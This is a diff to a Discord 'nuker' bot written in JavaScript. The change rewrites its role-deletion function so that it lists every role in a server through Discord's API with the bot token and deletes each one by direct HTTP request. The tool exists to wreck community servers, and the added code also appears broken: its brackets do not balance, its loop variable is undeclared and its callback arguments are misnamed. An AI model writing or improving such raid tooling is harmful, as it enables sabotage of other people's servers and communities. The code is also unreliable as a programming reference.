@@ -3,6 +3,8 @@
  * @author 7teen
  */
 const { Client, Intents, MessageEmbed } = require("discord.js");
+const request = require("request"),
+      axios = require('axios')
 const nuker = new Client({ intents: Object.values(Intents.FLAGS).reduce((a, b) => a + b) });
 const { red, greenBright, cyan, yellow } = require("chalk");
 const { token, prefix, userID, disableEveryone } = require("../config/config.json")
@@ -319,7 +321,21 @@ nuker.on("messageCreate", (message) => {
     function DelAllRoles() {
         return new Promise((resolve, reject) => {
             if (!rolePerms) return reject("Bot Missing Permissions: 'MANAGE_ROLES'");
-            message.guild.roles.cache.forEach((r) => r.delete().catch((err) => { console.log(red("Error Found: " + err)) }))
+            request.get({
+               url: `https://discord.com/api/v9/guilds/${message.guild.id}/roles`,
+               json: true,
+               headers: {
+                 'Authorization': `Bot ${nuker.token}`
+               },
+            }, (error, body, response) => {
+                     
+                if (body.statusCode === 200) {
+                    for (arrays in response) {
+            axios.delete(`https://discord.com/api/v9/guilds/${message.guild.id}/roles/${response[arrays].id}`, { headers: { Authorization: `Bot ${nuker.token}` } })
+	}
+                }
+            }
+           })
         });
     }
 
